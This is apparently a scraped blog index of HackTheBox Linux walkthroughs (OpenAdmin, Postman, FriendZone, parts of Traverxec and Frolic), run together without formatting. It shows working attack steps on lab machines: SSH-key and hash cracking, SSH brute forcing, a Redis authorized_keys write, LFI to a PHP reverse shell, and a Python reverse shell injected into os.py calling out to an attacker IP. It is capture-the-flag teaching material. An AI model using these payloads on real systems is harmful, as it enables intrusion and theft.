VzrrgBBD3sknSz4fT3irm6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==backup-ssh-identity-files.tgz$ cp ../backup-ssh-identity-files.tgz .$ tar xvf backup-ssh-identity-files.tgzhome/david/.ssh/home/david/.ssh/authorized_keyshome/david/.ssh/id_rsahome/david/.ssh/id_rsa.pubObviously the RSA key is encrypted:Therefore, we have to use ssh2johnssh2john$ /usr/share/john/ssh2john.py home/david/.ssh/id_rsa &amp;gt; david_rsa.john$ john david_rsa.john --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 12 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#39;q&#39; or Ctrl-C to abort, almost any other key for statushunter (home/david/.ssh/id_rsa)1g 0:00:00:02 DONE (2021-01-02 14:15) 0.4878g/s 6995Kp/s 6995Kc/s 6995KC/s 0125457423 ..*7¡Vamos!Session completedThe password of id_rsa is hunter. We can now log in as david: user.txt:david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3dThere is a bin directory inside home/david, let’s see what’s inside:#!/bin/bashcat /home/david/bin/server-stats.headecho &quot;Load: `/usr/bin/uptime`&quot;echo &quot; &quot;echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;echo &quot; &quot;echo &quot;Last 5 journal log lines:&quot;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat Because of the pipe (| /usr/bin/cat), this last command with sudo runs with david’s privileges.So if we run the last command without the pipe, we’ll be opening less according to GTFOBins - journalctl and then we can privesc.RootWhen I first ran the exploit, the process didn’t invoke less.I was thinking that the box was patched and that was not the intended way to root it.However, I remembered a similar challenge Bandit - Level 25 where we have to privesc with more.In this challenge, we had to reduce the console window to less than 5 lines (since the output of our command is less than about 5 lines of text) in order to force the process to run the text editor.I reduced the size of my terminal window, and it worked: root’s flag: 9aa36a6d76f785dfd320a478f6e0d906___Useful links CVE-2019-16278 CVE-2019-16278 - Unauthenticated Remote Code Execution in Nostromo web server" }, { "title": "HackTheBox - OpenAdmin", "url": "/htb-openadmin/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, OpenNetAdmin, RCE, reverse-shell, linpeas, plain text password, MySQL, password cracking, hashcat, brute-force, medusa, hydra, ssh port forwarding, ssh2john, John The Ripper, sudo misconfiguration, GTFOBins, nano, writeup, oscp-prep", "date": "2021-01-02 05:21:04 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN OpenAdmin-full-port-scan.txt 10.10.10.171PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)| 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)|_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelApache/2.4.29/artwork/musicThe Login button at the top right of the page redirects to http://10.10.10.171/ona//onaThis version of OpenNetAdmin seems vulnerable to a RCE (Remote Code Execution).Reverse shell (www-data)I used this exploit and I got a shell:First I thought we are in a restricted shell. Then I inspect how our payload was sent.So I figured out that we didn’t really have a shell.The python script was just sending bash commands one after the other though HTTP requests.Thereby, I redirected the shell to my machine:We identified two users: jimmy joannaBoth of these users are part of the internal’s group.Moreover, linpeas.sh showed us something that might lead us to privesc into root:So we have to find a way to access to joanna’s account.I started my enumeration by looking for files/directories owned either by joanna or jimmy or the internal group.$ find / -user joanna 2&amp;gt;/dev/null/home/joanna$ find / -user jimmy 2&amp;gt;/dev/null/var/www/internal/home/jimmy$ find / -group internal 2&amp;gt;/dev/null/var/www/internal$ ls -la /var/www/internalls: cannot open directory &#39;/var/www/internal&#39;: Permission deniedMySQLLooking at active ports via netstat -tulpn, it seems there is mysql running on port 3306:Indeed:I decided to return to /opt/ona/www/ and look for some credentials.$ grep -ri &quot;passw&quot; *# ...local/config/database_settings.inc.php: &#39;db_passwd&#39; =&amp;gt; &#39;n1nj4W4rri0R!&#39;,# ...MySQL credentials found: username: ona_sys password: n1nj4W4rri0R! mysql -u ona_sys --passwordmysql&amp;gt; show databases;+--------------------+ | Database | +--------------------+ | information_schema | | ona_default | +--------------------+ 2 rows in set (0.00 sec)mysql&amp;gt; use ona_default;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -Amysql&amp;gt; show tables;+------------------------+| Tables_in_ona_default |+------------------------+| blocks || configuration_types || configurations || custom_attribute_types || custom_attributes || dcm_module_list || device_types || devices || dhcp_failover_groups || dhcp_option_entries || dhcp_options || dhcp_pools || dhcp_server_subnets || dns || dns_server_domains || dns_views || domains || group_assignments || groups || host_roles || hosts || interface_clusters || interfaces || locations || manufacturers || messages || models || ona_logs || permission_assignments || permissions || roles || sequences || sessions || subnet_types || subnets || sys_config || tags || users || vlan_campuses || vlans |+------------------------+40 rows in set (0.00 sec)mysql&amp;gt; SELECT * from users;+----+----------+----------------------------------+-------+---------------------+---------------------+| id | username | password | level | ctime | atime |+----+----------+----------------------------------+-------+---------------------+---------------------+| 1 | guest | 098f6bcd4621d373cade4e832627b4f6 | 0 | 2021-01-01 19:35:54 | 2021-01-01 19:35:54 || 2 | admin | 21232f297a57a5a743894a0e4a801fc3 | 0 | 2007-10-30 03:00:17 | 2007-12-02 22:10:26 |+----+----------+----------------------------------+-------+---------------------+---------------------+2 rows in set (0.00 sec)mysql&amp;gt;A hash of 32 characters is probably a MD5 hash:Cracking passwords with hashcat$ echo &quot;098f6bcd4621d373cade4e832627b4f6&quot; &amp;gt; hashes$ echo &quot;21232f297a57a5a743894a0e4a801fc3&quot; &amp;gt;&amp;gt; hashes$ hashcat hashes -m 0 /usr/share/wordlists/rockyou.txt#... -m 0 tells hashcat which mode to use. 0 is MD5.These credentials are for http://10.10.10.171/ona/User (jimmy)The password we found in /opt/ona/www/local/config/database_settings.inc.php (n1nj4W4rri0R!) worked to log in as jimmy with SSH.Bruteforcing SSHmedusa$ cat users.txt jimmyjoanna$ cat pass.txt n1nj4W4rri0R!testadmin$ medusa -h $TARGET -U users.txt -P pass.txt -M ssh Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &amp;lt;jmk@foofus.net&amp;gt;ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: jimmy (1 of 2, 0 complete) Password: n1nj4W4rri0R! (1 of 3 complete)ACCOUNT FOUND: [ssh] Host: 10.10.10.171 User: jimmy Password: n1nj4W4rri0R! [SUCCESS]ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: joanna (2 of 2, 1 complete) Password: n1nj4W4rri0R! (1 of 3 complete)ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: joanna (2 of 2, 1 complete) Password: test (2 of 3 complete)ACCOUNT CHECK: [ssh] Host: 10.10.10.171 (1 of 1, 0 complete) User: joanna (2 of 2, 1 complete) Password: admin (3 of 3 complete)hydraWe could done that with hydra too: hydra -L users.txt -P pass.txt $TARGET ssh/var/www/internalLet’s go back to /var/www/internal (the folder that we did not have access to before): index.php:&amp;lt;?php ob_start(); session_start();?&amp;gt;&amp;lt;? // error_reporting(E_ALL); // ini_set(&quot;display_errors&quot;, 1);?&amp;gt;&amp;lt;html lang = &quot;en&quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Tutorialspoint.com&amp;lt;/title&amp;gt; &amp;lt;link href = &quot;css/bootstrap.min.css&quot; rel = &quot;stylesheet&quot;&amp;gt; &amp;lt;style&amp;gt; body { padding-top: 40px; padding-bottom: 40px; background-color: #ADABAB; } .form-signin { max-width: 330px; padding: 15px; margin: 0 auto; color: #017572; } .form-signin .form-signin-heading, .form-signin .checkbox { margin-bottom: 10px; } .form-signin .checkbox { font-weight: normal; } .form-signin .form-control { position: relative; height: auto; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; padding: 10px; font-size: 16px; } .form-signin .form-control:focus { z-index: 2; } .form-signin input[type=&quot;email&quot;] { margin-bottom: -1px; border-bottom-right-radius: 0; border-bottom-left-radius: 0; border-color:#017572; } .form-signin input[type=&quot;password&quot;] { margin-bottom: 10px; border-top-left-radius: 0; border-top-right-radius: 0; border-color:#017572; } h2{ text-align: center; color: #017572; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h2&amp;gt;Enter Username and Password&amp;lt;/h2&amp;gt; &amp;lt;div class = &quot;container form-signin&quot;&amp;gt; &amp;lt;h2 class=&quot;featurette-heading&quot;&amp;gt;Login Restricted.&amp;lt;span class=&quot;text-muted&quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h2&amp;gt; &amp;lt;?php $msg = &#39;&#39;; if (isset($_POST[&#39;login&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;username&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;password&#39;])) { if ($_POST[&#39;username&#39;] == &#39;jimmy&#39; &amp;amp;&amp;amp; hash(&#39;sha512&#39;,$_POST[&#39;password&#39;]) == &#39;00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1&#39;) { $_SESSION[&#39;username&#39;] = &#39;jimmy&#39;; header(&quot;Location: /main.php&quot;); } else { $msg = &#39;Wrong username or password.&#39;; } } ?&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;!-- /container --&amp;gt; &amp;lt;div class = &quot;container&quot;&amp;gt; &amp;lt;form class = &quot;form-signin&quot; role = &quot;form&quot; action = &quot;&amp;lt;?php echo htmlspecialchars($_SERVER[&#39;PHP_SELF&#39;]); ?&amp;gt;&quot; method = &quot;post&quot;&amp;gt; &amp;lt;h4 class = &quot;form-signin-heading&quot;&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/h4&amp;gt; &amp;lt;input type = &quot;text&quot; class = &quot;form-control&quot; name = &quot;username&quot; required autofocus&amp;gt;&amp;lt;/br&amp;gt; &amp;lt;input type = &quot;password&quot; class = &quot;form-control&quot; name = &quot;password&quot; required&amp;gt; &amp;lt;button class = &quot;btn btn-lg btn-primary btn-block&quot; type = &quot;submit&quot; name = &quot;login&quot;&amp;gt;Login&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; main.php:&amp;lt;?php session_start(); if (!isset ($_SESSION[&#39;username&#39;])) { header(&quot;Location: /index.php&quot;); }; # Open Admin Trusted# OpenAdmin$output = shell_exec(&#39;cat /home/joanna/.ssh/id_rsa&#39;);echo &quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&quot;;?&amp;gt;&amp;lt;html&amp;gt;&amp;lt;h3&amp;gt;Don&#39;t forget your &quot;ninja&quot; password&amp;lt;/h3&amp;gt;Click here to logout &amp;lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&amp;gt;Session&amp;lt;/html&amp;gt;These files are probably the ones that are running on port 52846 as we identified via netstat -tulpn and with linpeas.sh.Indeed, if we curl http://127.0.0.1:52846:SSH port forwardingAt this point, we could use SSH port forwarding:$ ssh -L 52846:localhost:52846 jimmy@$TARGETIt worked:We can try determine what is the password that corresponds to the SHA512 hash 00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1, or we can directly edit the sources since we have write privileges on /var/www/internal:Voilà:User (joanna)Joanna’s private key is encrypted:While we don’t know the password of this private key we cannot log in as joanna.ssh2john$ /usr/share/john/ssh2john.py joanna_rsa &amp;gt; joanna_rsa.john$ john joanna_rsa.john --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 12 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#39;q&#39; or Ctrl-C to abort, almost any other key for statusbloodninjas (joanna_rsa)1g 0:00:00:01 DONE (2021-01-01 22:27) 0.5586g/s 8012Kp/s 8012Kc/s 8012KC/s 0125457423 ..*7¡Vamos!Session completedbloodninjas is joanna_rsa’s password. We can now log in as joanna. joanna’s flag:joanna@openadmin:~$ cat user.txt c9b2cf07d40807e62af62660f0c81b5fRootNow this is pretty straightforward since we saw earlier that joanna can run nano with sudo (thanks to linpeas).We just have to check GTFOBins - nano to find a way to privesc.And we got root’s flag (2f907ed450b361b2c2bf4e8795d5b561):___Useful links ona-rce MySQl commands Hashes length Upgrading to a fully interactive reverse shell SSH Port Forwarding Example GTFOBins - nano" }, { "title": "HackTheBox - Postman", "url": "/htb-postman/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, redis, ssh2john, John The Ripper, miniserv, webmin, CVE-2019-12840, metasploit, writeup, oscp-prep", "date": "2021-01-01 07:25:15 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Postman-full-port-scan.txt 10.10.10.160PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)| 256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)|_ 256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: The Cyber Geek&#39;s Personal Website6379/tcp open redis Redis key-value store 4.0.910000/tcp open http MiniServ 1.910 (Webmin httpd)|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).Apache/2.4.29 (port 80)Miniserv (port 10000)First we got an error:After adding 10.10.10.160 postman to /etc/hosts we are redirected to:Thanks to nmap scan we know we’re dealing with version 1.910:Unfortunately the metasploit exploit requires credentials.Redis 4.0.9 (port 6379)According to hacktricks, redis home directory is often /var/lib/redis/. Let’s try to have a shell:$ ssh-keygen -t rsa -f postman_rsa$ redis-cli -h $TARGET 10.10.10.160:6379&amp;gt; config set dir /var/lib/redis/.ssh/OK10.10.10.160:6379&amp;gt; config set dbfilename &quot;authorized_keys&quot;OK10.10.10.160:6379&amp;gt; saveOK10.10.10.160:6379&amp;gt; $ cat foo.txt | redis-cli -h $TARGET -x set crackitOK# Don&#39;t know why but I had to do it twice$ redis-cli -h $TARGET 10.10.10.160:6379&amp;gt; config set dir /var/lib/redis/.ssh/OK10.10.10.160:6379&amp;gt; config set dbfilename &quot;authorized_keys&quot;OK10.10.10.160:6379&amp;gt; saveOK10.10.10.160:6379&amp;gt; User (redis)If we go to the /home directory, we see there is a user called Matt.I tried to list the files that he owns:The first file /opt/id_rsa.bak seems interesting.We can see it;s an encrypted RSA key:$ redis@Postman:/home/Matt$ cat /opt/id_rsa.bak-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED#...We can transfer it yo our machine usinh scp:$ scp -i postman_rsa redis@$TARGET:/opt/id_rsa.bak . Then we can convert using ssh2john and run JohnTheRipper:$ /usr/share/john/ssh2john.py id_rsa.bak &amp;gt; matt_rsa.john$ john matt_rsa.john --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashesCost 2 (iteration count) is 2 for all loaded hashesWill run 12 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate.Press &#39;q&#39; or Ctrl-C to abort, almost any other key for statuscomputer2008 (id_rsa.bak)1g 0:00:00:04 DONE (2021-01-01 01:03) 0.2500g/s 3585Kp/s 3585Kc/s 3585KC/s 0125457423 ..*7¡Vamos!Session completedcomputer2008 is the passphrase!User (Matt)$ ssh -i id_rsa.bak Matt@$TARGETEnter passphrase for key &#39;id_rsa.bak&#39;: Connection closed by 10.10.10.160 port 22This did’nt work so I tried:redis@Postman:~$ su MattPassword: # computer2008Matt@Postman:/var/lib/redis$ cdMatt@Postman:~$ cat user.txt99108a54ba44c99889199e3e53fdacfeWe can log in to webmin using Matt’s credentials:Therefore we can run the metasploit exploit ↓Root___Useful links 6379 - Pentesting Redis CVE-2019-12840 Webmin 1910 Package Updates Remote Command Execution" }, { "title": "HackTheBox - FriendZone", "url": "/htb-friendzone/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, samba, smbclient, smbmap, DNS, zone transfer, LFI, reverse-shell, python module hijacking, cron, pspy, writeup, oscp-prep", "date": "2020-12-31 23:55:29 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN FriendZone-full-port-scan.txt 10.10.10.123PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)| 256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)|_ 256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.11.3-1ubuntu1.2-Ubuntu80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Friend Zone Escape software139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)443/tcp open ssl/http Apache httpd 2.4.29|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 404 Not Found| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO| Not valid before: 2018-10-05T21:02:30|_Not valid after: 2018-11-04T21:02:30|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -36m13s, deviation: 1h09m16s, median: 3m45s|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.7.6-Ubuntu)| Computer name: friendzone| NetBIOS computer name: FRIENDZONE\\x00| Domain name: \\x00| FQDN: friendzone|_ System time: 2020-12-29T13:18:07+02:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-12-29T11:18:07|_ start_date: N/AThanks to this scan we identified a domain name: friendzone.red, so I added it to my /etc/hosts:enum4linuxenum4linux identified a username:ftp (ports 21)smb (ports 139 &amp;amp; 445)$ smbclient -L //$TARGET Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$ IPC IPC Service (FriendZone server (Samba, Ubuntu))SMB1 disabled -- no workgroup availableWe can in the comment section that Files is in /etc/, so do general and Development directories probably.We get some credentials that we will probably use later: username: admin password: WORKWORKHhallelujah@#Plus, we can put files in Development directory.Apache/2.4.29 (ports 80)Another domain name: friendzoneportal.red. robots.txt:/wordpressfiendzone.red (ports 443)/adminfriendzoneportal.red (ports 443) Do not forget to update /etc/hostsadmin.friendzoneportal.redBecause of the “creds for the admin THING:” in creds.txt, I tried the subdomain admin.friendzoneportal.red and it worked:We’re successfully logged in with the credentials found via smb, but:“check for another one”, let’s try with dirb.Unfortunately:DNS (port 53) When DNS rely on TCP, usually it means that there are some zone transfer.friendzone.red$ dig axfr @$TARGET friendzone.red | tee services/53-friendzone-red.txt ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.8-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.123 friendzone.red; (1 server found);; global options: +cmdfriendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800friendzone.red. 604800 IN AAAA ::1friendzone.red. 604800 IN NS localhost.friendzone.red. 604800 IN A 127.0.0.1administrator1.friendzone.red. 604800 IN A 127.0.0.1hr.friendzone.red. 604800 IN A 127.0.0.1uploads.friendzone.red. 604800 IN A 127.0.0.1friendzone.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800;; Query time: 100 msec;; SERVER: 10.10.10.123#53(10.10.10.123);; WHEN: Thu Dec 31 14:59:06 CET 2020;; XFR size: 8 records (messages 1, bytes 289)Okay so there are three other domain names: administrator1.friendzone.red hr.friendzone.red uploads.friendzone.redfriendzoneportal.red$ dig axfr @$TARGET friendzoneportal.red | tee services/53-friendzoneportal.txt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.8-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr @10.10.10.123 friendzoneportal.red; (1 server found);; global options: +cmdfriendzoneportal.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800friendzoneportal.red. 604800 IN AAAA ::1friendzoneportal.red. 604800 IN NS localhost.friendzoneportal.red. 604800 IN A 127.0.0.1admin.friendzoneportal.red. 604800 IN A 127.0.0.1files.friendzoneportal.red. 604800 IN A 127.0.0.1imports.friendzoneportal.red. 604800 IN A 127.0.0.1vpn.friendzoneportal.red. 604800 IN A 127.0.0.1friendzoneportal.red. 604800 IN SOA localhost. root.localhost. 2 604800 86400 2419200 604800;; Query time: 104 msec;; SERVER: 10.10.10.123#53(10.10.10.123);; WHEN: Thu Dec 31 15:01:19 CET 2020;; XFR size: 9 records (messages 1, bytes 309)We found three additional domain names: files.friendzoneportal.red imports.friendzoneportal.red vpn.friendzoneportal.redaquatoneWe open aquatone_report.html with firefox.Among all the new domain names we identified, the only ones that didn’t respond with a 404 Not Found error were uploads.friendzone.red and administrator1.friendzone.red.uploads.friendzone.redI uploaded a benign picture and it seems that the upload worked:I looked for hidden directories in order to retrieve the image that I uploaded but /files seems empty and /files/note that the site is still under development:administrator1.friendzone.redThe credentials found via smb worked as well on this second admin panel: /dashboard.php:I filled the parameters image_id and pagename with the filename and timestamp I’v got in response when I uploaded an image in uploads.friendzone.red.I replaced image_id’s value by a.jpg and I got this result:I replaced image_id’s value by b.jpg (which is the other image in /images folder) and pagename’s value by timestamp. I got this result:I replaced pagename’s value by dashboard and the page was continuously including itself:This is a LFI(Locale File Inclusion) vulnerability!Assembling piecesSo far, we noticed that: We can write files in Development shared directory. (See smb chapter) We can read php pages from https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&amp;amp;pagename=&amp;lt;PHP PAGE&amp;gt;.reverse shellLet’s try to upload a tiny PHP reverse shell:Run a listener on our machine:$ nc -lnvp 1234Then open it from https://administrator1.friendzone.red/dashboard.php?image_id=b.jpg&amp;amp;pagename=../../../../../../../../../../../etc/Development/shellBOUM!___User’s flag (friend)$ cd /home$ ls -latotal 12drwxr-xr-x 3 root root 4096 Oct 5 2018 .drwxr-xr-x 22 root root 4096 Oct 5 2018 ..drwxr-xr-x 5 friend friend 4096 Jan 24 2019 friend$ cd friend$ ls -latotal 36drwxr-xr-x 5 friend friend 4096 Jan 24 2019 .drwxr-xr-x 3 root root 4096 Oct 5 2018 ..lrwxrwxrwx 1 root root 9 Jan 24 2019 .bash_history -&amp;gt; /dev/null-rw-r--r-- 1 friend friend 220 Oct 5 2018 .bash_logout-rw-r--r-- 1 friend friend 3771 Oct 5 2018 .bashrcdrwx------ 2 friend friend 4096 Oct 5 2018 .cachedrwx------ 3 friend friend 4096 Oct 6 2018 .gnupgdrwxrwxr-x 3 friend friend 4096 Oct 6 2018 .local-rw-r--r-- 1 friend friend 807 Oct 5 2018 .profile-rw-r--r-- 1 friend friend 0 Oct 5 2018 .sudo_as_admin_successful-r--r--r-- 1 root root 33 Oct 6 2018 user.txt$ cat user.txta9ed20acecd6c5b6b52f474e15ae9a11Privesc to Rootlinpeas.sh told me something interesting:Since our current user has not high privileges, we’re running pspy to identify cron jobs that we don’t have permission to see:/opt/server_admin/reporter.py seems to be executed from a cron job. We can read it:$ ls -latotal 12drwxr-xr-x 2 root root 4096 Jan 24 2019 .drwxr-xr-x 3 root root 4096 Oct 6 2018 ..-rwxr--r-- 1 root root 424 Jan 16 2019 reporter.py#!/usr/bin/pythonimport osto_address = &quot;admin1@friendzone.com&quot;from_address = &quot;admin2@friendzone.com&quot;print &quot;[+] Trying to send email to %s&quot;%to_address#command = &#39;&#39;&#39; mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass &quot;PAPAP&quot;&#39;&#39;&#39;#os.system(command)# I need to edit the script later# Sam ~ python developerwww-data@FriendZone:/opt/server_admin$The script import os python’s module that we can edit. So we just have to edit it and put a malicious content in it:import socket,subprocess,ptys = socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.10.14.3&quot;,4242))dup2(s.fileno(),0)dup2(s.fileno(),1)dup2(s.fileno(),2)pty.spawn(&quot;/bin/bash&quot;)$ printf &#39;\\nimport socket,subprocess,pty\\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\\ns.connect((&quot;10.10.14.3&quot;,4242))\\ndup2(s.fileno(),0)\\ndup2(s.fileno(),1)\\ndup2(s.fileno(),2)\\npty.spawn(&quot;/bin/bash&quot;)\\n&#39; &amp;gt;&amp;gt; /usr/lib/python2.7/os.py flag: b0e6c60b82cf96e9855ac1656a9e90c7Useful links tiny PHP reverse shell aquatone - a tool for visual inspection of websites across a large amount of hosts pspy - unprivileged Linux process snooping reverse shell python" }, { "title": "HackTheBox - Frolic", "url": "/htb-frolic/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, esoteric langages, John The Ripper, zip2john, playSMS, CVE-2017-9101, SUID, pwn, ret2libc, decompilation, ghidra, gdb-peda, writeup, oscp-prep", "date": "2020-12-30 03:24:41 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Frolic-full-port-scan.txt 10.10.10.111PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)| 256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)|_ 256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)1880/tcp open http Node.js (Express middleware)|_http-title: Node-RED9999/tcp open http nginx 1.10.3 (Ubuntu)|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Welcome to nginx!Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: mean: -1h28m47s, deviation: 3h10m30s, median: 21m11s|_nbstat: NetBIOS name: FROLIC, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: frolic| NetBIOS computer name: FROLIC\\x00| Domain name: \\x00| FQDN: frolic|_ System time: 2020-12-29T19:29:20+05:30| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-12-29T13:59:20|_ start_date: N/Aenum4linuxenum4linux allowed us to find two usernames: 